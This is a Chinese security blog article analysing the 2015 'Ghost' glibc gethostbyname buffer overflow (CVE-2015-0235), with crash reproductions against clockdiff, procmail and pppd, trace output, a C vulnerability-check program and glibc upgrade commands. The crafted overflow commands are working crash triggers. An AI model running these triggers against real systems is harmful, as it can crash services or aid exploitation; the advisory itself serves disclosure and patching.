<p><span style="color: #ff6600;"><strong>clockdiff</strong></span></p>
<pre class="lang:python decode:true ">root@h-virtual-machine:~# clockdiff $(python -c "print '0' * $((0x20000-16*1-2*4-1-4))")
Segmentation fault (core dumped)</pre>
<p>调用gethostbyname，执行__strdup时溢出</p>
<pre class="lang:python decode:true ">root@h-virtual-machine:~# ltrace clockdiff $(python -c "print '0' * $((0x20000-16*1-2*4-1-4))")
__libc_start_main(0x8048960, 2, 0xbfb52774, 0x8049cd0, 0x8049d40 &lt;unfinished ...&gt;
socket(2, 3, 1)                                  = 3
__errno_location()                               = 0xb75d08c8
getuid()                                         = 0
setuid(0)                                        = 0
fileno(0xb7778ac0)                               = 0
isatty(0)                                        = 1
fileno(0xb7778a20)                               = 1
isatty(1)                                        = 1
getpid()                                         = 9907
gethostname("h-virtual-machine", 1025)           = 0
gethostbyname("h-virtual-machine")               = 0xb777aef8
__strdup(0x91d502a, 1025, 1, 64, 4)              = 0x91d55f0
gethostbyname("00000000000000000000000000000000"...) = 0xb777aef8
__strdup(0x91d5cec, 1025, 1, 64, 4 &lt;unfinished ...&gt;
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++</pre>
<p><strong><span style="color: #ff6600;">procmail</span></strong></p>
<pre class="lang:python decode:true ">root@h-virtual-machine:~# ltrace /usr/bin/procmail 'VERBOSE=on' 'COMSAT=@'`python -c "print '0' * $((0x500-16*1-2*4-1-4))"` &lt; /dev/null
----snip---
socket(2, 2, 17)                                                                                                                    = 4
strlen("root@8:/var/mail/root")                                                                                                     = 21
sendto(4, 0x83358c8, 21, 0, 0x805d7f8)                                                                                              = 21
close(4)                                                                                                                            = 0
strlen("procmail")                                                                                                                  = 8
memmove(0x8337168, 0x80580e3, 8, 0x10000000, 1)                                                                                     = 0x8337168
strlen(": ")                                                                                                                        = 2
memmove(0x8337170, 0x8058d78, 2, 0x10000000, 1)                                                                                     = 0x8337170
time(NULL)                                                                                                                          = 1422509804
strlen("Notified comsat:")                                                                                                          = 16
memmove(0x8337172, 0x8059416, 16, 0x10000000, 1)                                                                                    = 0x8337172
strlen(" "")                                                                                                                        = 2
memmove(0x8337182, 0x80580ef, 2, 0, 0x8048838)                                                                                      = 0x8337182
strlen("root@8:/var/mail/root")                                                                                                     = 21
memmove(0x8337184, 0x83358c8, 21, 0, 0x8048838)                                                                                     = 0x8337184
strlen(""\n")                                                                                                                       = 2
memmove(0x8337199, 0x80580ec, 2, 0x83358c8, 0x83358c8)                                                                              = 0x8337199
write(2, "procmail: Notified comsat: "root"..., 51procmail: Notified comsat: "root@8:/var/mail/root"
)                                                                                 = 51
malloc(280)                                                                                                                         = 0x08337ee8
free(0x08337ee8*** glibc detected *** /usr/bin/procmail: free(): invalid next size (normal): 0x08337ee8 ***</pre>
<p>&nbsp;</p>
<p>由于破坏了内存结构，在free时出错。</p>
<p><span style="color: #ff6600;"><strong>pppd</strong></span></p>
<pre class="lang:python decode:true ">root@h-virtual-machine:~# /usr/sbin/pppd 'dryrun' 'ms-dns' `python -c "print '0' * $((0x1000-16*1-2*4-16-4))"`'377.255.255.255'
*** glibc detected *** /usr/sbin/pppd: free(): invalid next size (normal): 0x09955920 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x75f12)[0xb75b6f12]
/lib/i386-linux-gnu/libc.so.6(+0x65de5)[0xb75a6de5]
/lib/i386-linux-gnu/libc.so.6(fopen+0x2b)[0xb75a6e1b]
/usr/sbin/pppd(options_from_file+0xa8)[0x8064948]
/usr/sbin/pppd(options_for_tty+0xde)[0x8064d7e]
/usr/sbin/pppd(tty_process_extra_options+0xa4)[0x806e1a4]
/usr/sbin/pppd(main+0x1cf)[0x8050b2f]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb755a4e3]
======= Memory map: ========
08048000-08087000 r-xp 00000000 fd:01 11976      /usr/sbin/pppd
08087000-08088000 r--p 0003e000 fd:01 11976      /usr/sbin/pppd
08088000-0808c000 rw-p 0003f000 fd:01 11976      /usr/sbin/pppd
0808c000-080d9000 rw-p 00000000 00:00 0 
09952000-09973000 rw-p 00000000 00:00 0          [heap]
b74d5000-b74f1000 r-xp 00000000 fd:01 265720     /lib/i386-linux-gnu/libgcc_s.so.1
b74f1000-b74f2000 r--p 0001b000 fd:01 265720     /lib/i386-linux-gnu/libgcc_s.so.1
b74f2000-b74f3000 rw-p 0001c000 fd:01 265720     /lib/i386-linux-gnu/libgcc_s.so.1
b7503000-b750e000 r-xp 00000000 fd:01 265750     /lib/i386-linux-gnu/libnss_files-2.15.so
b750e000-b750f000 r--p 0000a000 fd:01 265750     /lib/i386-linux-gnu/libnss_files-2.15.so
b750f000-b7510000 rw-p 0000b000 fd:01 265750     /lib/i386-linux-gnu/libnss_files-2.15.so
b7510000-b751a000 r-xp 00000000 fd:01 265754     /lib/i386-linux-gnu/libnss_nis-2.15.so
b751a000-b751b000 r--p 00009000 fd:01 265754     /lib/i386-linux-gnu/libnss_nis-2.15.so
b751b000-b751c000 rw-p 0000a000 fd:01 265754     /lib/i386-linux-gnu/libnss_nis-2.15.so
b751c000-b7532000 r-xp 00000000 fd:01 265744     /lib/i386-linux-gnu/libnsl-2.15.so
b7532000-b7533000 r--p 00015000 fd:01 265744     /lib/i386-linux-gnu/libnsl-2.15.so
b7533000-b7534000 rw-p 00016000 fd:01 265744     /lib/i386-linux-gnu/libnsl-2.15.so
b7534000-b7536000 rw-p 00000000 00:00 0 
b7536000-b753d000 r-xp 00000000 fd:01 265746     /lib/i386-linux-gnu/libnss_compat-2.15.so
b753d000-b753e000 r--p 00006000 fd:01 265746     /lib/i386-linux-gnu/libnss_compat-2.15.so
b753e000-b753f000 rw-p 00007000 fd:01 265746     /lib/i386-linux-gnu/libnss_compat-2.15.so
b753f000-b7541000 rw-p 00000000 00:00 0 
b7541000-b76e5000 r-xp 00000000 fd:01 265699     /lib/i386-linux-gnu/libc-2.15.so
b76e5000-b76e6000 ---p 001a4000 fd:01 265699     /lib/i386-linux-gnu/libc-2.15.so
b76e6000-b76e8000 r--p 001a4000 fd:01 265699     /lib/i386-linux-gnu/libc-2.15.so
b76e8000-b76e9000 rw-p 001a6000 fd:01 265699     /lib/i386-linux-gnu/libc-2.15.so
b76e9000-b76ec000 rw-p 00000000 00:00 0 
b76ec000-b7720000 r-xp 00000000 fd:01 5019       /usr/lib/i386-linux-gnu/libpcap.so.1.1.1
b7720000-b7721000 ---p 00034000 fd:01 5019       /usr/lib/i386-linux-gnu/libpcap.so.1.1.1
b7721000-b7722000 r--p 00034000 fd:01 5019       /usr/lib/i386-linux-gnu/libpcap.so.1.1.1
b7722000-b7723000 rw-p 00035000 fd:01 5019       /usr/lib/i386-linux-gnu/libpcap.so.1.1.1
b7723000-b7726000 r-xp 00000000 fd:01 265712     /lib/i386-linux-gnu/libdl-2.15.so
b7726000-b7727000 r--p 00002000 fd:01 265712     /lib/i386-linux-gnu/libdl-2.15.so
b7727000-b7728000 rw-p 00003000 fd:01 265712     /lib/i386-linux-gnu/libdl-2.15.so
b7728000-b7734000 r-xp 00000000 fd:01 265761     /lib/i386-linux-gnu/libpam.so.0.83.0
b7734000-b7735000 r--p 0000b000 fd:01 265761     /lib/i386-linux-gnu/libpam.so.0.83.0
b7735000-b7736000 rw-p 0000c000 fd:01 265761     /lib/i386-linux-gnu/libpam.so.0.83.0
b7736000-b7737000 rw-p 00000000 00:00 0 
b7737000-b773f000 r-xp 00000000 fd:01 265707     /lib/i386-linux-gnu/libcrypt-2.15.so
b773f000-b7740000 r--p 00007000 fd:01 265707     /lib/i386-linux-gnu/libcrypt-2.15.so
b7740000-b7741000 rw-p 00008000 fd:01 265707     /lib/i386-linux-gnu/libcrypt-2.15.so
b7741000-b7768000 rw-p 00000000 00:00 0 
b7768000-b776a000 r-xp 00000000 fd:01 265803     /lib/i386-linux-gnu/libutil-2.15.so
b776a000-b776b000 r--p 00001000 fd:01 265803     /lib/i386-linux-gnu/libutil-2.15.so
b776b000-b776c000 rw-p 00002000 fd:01 265803     /lib/i386-linux-gnu/libutil-2.15.so
b777b000-b777e000 rw-p 00000000 00:00 0 
b777e000-b777f000 r-xp 00000000 00:00 0          [vdso]
b777f000-b779f000 r-xp 00000000 fd:01 265679     /lib/i386-linux-gnu/ld-2.15.so
b779f000-b77a0000 r--p 0001f000 fd:01 265679     /lib/i386-linux-gnu/ld-2.15.so
b77a0000-b77a1000 rw-p 00020000 fd:01 265679     /lib/i386-linux-gnu/ld-2.15.so
bfbb6000-bfbd8000 rw-p 00000000 00:00 0          [stack]
Aborted (core dumped)</pre>
<p>&nbsp;</p>
<p>pppd的ms-wins和socket选项也存在同样的问题。</p>
<p>glibc(补丁2013年5月21日就发布过了，不过没有引起重视).</p>
<p>查看有那些服务用了glibc, 用了这系列函数都有可能是潜在的威胁。</p>
<pre class="lang:python decode:true ">root@H:/tmp# lsof | grep libc | awk '{print $1}' | sort | uniq
accounts-
awk
bash
Cache
--snip--
gvfs-gpho
httpd</pre>
<p>&nbsp;</p>
<h2>四：影响</h2>
<p>服务器上gethostbyname() 函数用的挺多。许多DNS解析服务都可能会和这个漏洞有关。毕竟是底层库，影响还是挺大的。</p>
<div id="crayon-54ca5858081b1530086333-1" class="crayon-line">
<pre class="lang:python decode:true">·邮件服务器连接IP时，使用的DNS反查，DNS黑名单，SPF等机制
·表单提交时，绕过允许用户内容导致一个DNS查询时，比如URL，WordPress的XML-RPC pingback等
·MySQL服务器做基于主机名的认证检查时(以MySQL权限)
·SSH服务器对允许/拒绝规则认证时，使用DNS查询的
·php中也有部分文件引用了这个函数。
</pre>
<p>&nbsp;</p>
<p>可以用ltrace命令来看下是否用到了getbyhostname这类函数。</p>
<p>DNS查询都可能会触发这个漏洞，幸运的是漏洞并不会立刻造成提权，但是结合其他的漏洞或者bug导致提权就不得而知了。</p>
<p>&nbsp;</p>
<h2>五：poc</h2>
<p>测试方法：</p>
<pre class="lang:python decode:true">gcc secpulse.c -o CVE-2015-0235
 
./CVE-2015-0235</pre>
<p>secpulse.c</p>
<pre class="lang:python decode:true ">#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;gnu/libc-version.h&gt;
 
#define CANARY "in_the_coal_mine"
 
struct {
 char buffer[1024];
 char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };
 
int main(void) {
 puts ("SecPulse.com Hint Your glibc version is:\t");
 puts(gnu_get_libc_version ());
 struct hostent resbuf;
 struct hostent *result;
 int herrno;
 int retval;
 
 /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
 size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
 char name[sizeof(temp.buffer)];
 memset(name, '0', len);
 name[len] = '\0';
 
 retval = gethostbyname_r(name, &amp;resbuf, temp.buffer, sizeof(temp.buffer), &amp;result, &amp;herrno);
 
 if (strcmp(temp.canary, CANARY) != 0) {
 puts("vulnerable");
 exit(EXIT_SUCCESS);
 }
 if (retval == ERANGE) {
 puts("not vulnerable");
 exit(EXIT_SUCCESS);
 }
 puts("should not happen");
 exit(EXIT_FAILURE);
}</pre>
<p>&nbsp;</p>
<h2><strong>修复方案</strong></h2>
<p><strong>执行glibc升级命令</strong></p>
<p><strong>RHEL、Fedora、CentOS系统</strong></p>
<div id="crayon-54ca5b4da7f3d735226601" class="crayon-syntax crayon-theme-familiar crayon-font-consolas crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap">
<pre class="lang:python decode:true">yum update -y glibc --skip-broken</pre>
</div>
<div class="crayon-main"></div>
</div>
<p><strong>Debian、Ubuntu系统</strong></p>
<div id="crayon-54ca5b4da7f42770401187" class="crayon-syntax crayon-theme-familiar crayon-font-consolas crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover">
<div class="crayon-plain-wrap">
<pre class="lang:python decode:true">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade</pre>
</div>
</div>
<p>update之后如果未生效，要重启依赖glibc的进程。</p>
<p>&nbsp;</p>
<p>【本文来源：<a href="http://www.jianzhen-lab.com/306.html" target="_blank">CVE 2015-0235:Ghost glibc 缓存区溢出漏洞分析</a>   SP小编整理发布】</p>
<p>&nbsp;</p>
</div>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/skip-broken" rel="tag">--skip-broken</a><a href="https://www.secpulse.com/archives/tag/clockdiff" rel="tag">clockdiff</a><a href="https://www.secpulse.com/archives/tag/cve-2015-0235" rel="tag">CVE-2015-0235</a><a href="https://www.secpulse.com/archives/tag/digits_dots-c" rel="tag">digits_dots.c</a><a href="https://www.secpulse.com/archives/tag/gethostbyname" rel="tag">gethostbyname*()</a><a href="https://www.secpulse.com/archives/tag/ghost-glibc" rel="tag">Ghost glibc</a><a href="https://www.secpulse.com/archives/tag/ghost-glibc-%e7%bc%93%e5%ad%98%e5%8c%ba%e6%ba%a2%e5%87%ba%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" rel="tag">Ghost glibc 缓存区溢出漏洞分析</a><a href="https://www.secpulse.com/archives/tag/glibc" rel="tag">glibc</a><a href="https://www.secpulse.com/archives/tag/glibc-%e7%bc%93%e5%ad%98%e5%8c%ba%e6%ba%a2%e5%87%ba%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" rel="tag">glibc 缓存区溢出漏洞分析</a><a href="https://www.secpulse.com/archives/tag/ltrace" rel="tag">ltrace</a><a href="https://www.secpulse.com/archives/tag/pppd" rel="tag">pppd</a><a href="https://www.secpulse.com/archives/tag/procmail" rel="tag">procmail</a><a href="https://www.secpulse.com/archives/tag/secpulse-c" rel="tag">secpulse.c</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/4469.html" title="详细阅读 幽灵漏洞波及WordPress等web程序">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/02/ghost-glibc-vulnerabilitywordPress.jpg&h=150&w=249&zc=1" alt="幽灵漏洞波及WordPress等web程序" class="xg-img"/>
		<p>幽灵漏洞波及WordPress等web程&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/4352.html" title="详细阅读 CVE-2015-0235：Linux Glibc幽灵漏洞允许黑客远程获取系统权限">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2015/01/t01a9aa0ba7525f02de-1024x632.png&h=150&w=249&zc=1" alt="CVE-2015-0235：Linux Glibc幽灵漏洞允许黑客远程获取系统权限" class="xg-img"/>
		<p>CVE-2015-0235：Linux &hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/59444.html" title="详细阅读 企业安全丨旧瓶新酒之ngx_lua &amp; fail2ban实现主动诱捕">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/07/下载3.jpg&h=150&w=249&zc=1" alt="企业安全丨旧瓶新酒之ngx_lua &amp; fail2ban实现主动诱捕" class="xg-img"/>
		<p>企业安全丨旧瓶新酒之ngx_lua &a</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='4440' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="c45134e8a8" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="92"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/4440.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/01/spediator-150x150.jpg" width="96" height="96" alt="SP小编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_editor" title="由SP小编发布" rel="author">SP小编</a><br>
 <span class="au-title">总共218篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
交流和分享以及愉快的玩耍	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/41557.html" rel="bookmark" title="详细阅读 华医网某站点配置不当导致Shell（百万级会员信息\已远程桌面\攻陷多个站点和服务器）">华医网某站点配置不当导致Shell（百万级会员信息\已远程桌面\攻陷多个站点和服务器）</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/41634.html" rel="bookmark" title="详细阅读 绿城集团核心系统漏洞影响全国绿城房产80W+客户信息/销售数据/优惠券/投诉处理">绿城集团核心系统漏洞影响全国绿城房产80W+客户信息/销售数据/优惠券/投诉处理</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/32431.html" rel="bookmark" title="详细阅读 住哪网某站SQL注入漏洞可影响全网库">住哪网某站SQL注入漏洞可影响全网库</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/8823.html" rel="bookmark" title="详细阅读 好车网（goodcar.cn）网站目录遍历，暴露内部信息">好车网（goodcar.cn）网站目录遍历，暴露内部信息</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/28036.html" rel="bookmark" title="详细阅读 丽江市LED显示屏信息显示系统漏洞续(内网漫游)">丽江市LED显示屏信息显示系统漏洞续(内网漫游)</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
